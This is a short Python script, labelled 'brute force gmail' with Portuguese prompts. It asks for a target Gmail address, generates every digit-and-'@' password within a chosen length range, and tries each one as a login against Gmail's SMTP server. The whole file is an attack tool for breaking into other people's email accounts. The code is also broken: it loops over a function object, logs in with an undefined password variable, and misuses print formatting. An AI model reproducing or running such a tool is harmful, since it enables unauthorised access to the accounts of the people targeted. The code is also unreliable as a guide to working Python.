
import smtplib
import threading
from optparse import *
import itertools 
import smtplib
try :
    from proxylist import ProxyList
except:
    print("pip3 install proxylist ")
try :
    from mechanize import Browser
except:
    print("pip3 install mechanize")
from os import *
import sys
import logging
import io
import random
try:
    import cookielib
except:
    import http.cookiejar as cookielib
try:
    import mechanize
except:
    print("pip3 install mechanize ")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print('''
	==========================================
	|            brute force gmail           |
	|----------------------------------------|
	|                                        |
  |              Por Gilmar Filho          |
	|                                        |
  |                                        |
	|----------------------------------------|
	''')

user = input("Entre com o Gmail alvo: ")
min_digitos = (int(input("Entre a quantidade de caracteres minimos: ")))
qnt_digitos = (int(input("Entre com a quantidade de caracteres maximos: ")))
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("1234567890@", min_digitos, qnt_digitos)

for symbols in print_perms:
    try:
        smtpserver.login(user, password)

        print ("[+] Senha encontrada: %s") % symbols
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!] Senha tem mais do que "  + qnt_digitos + ": %s") % symbols
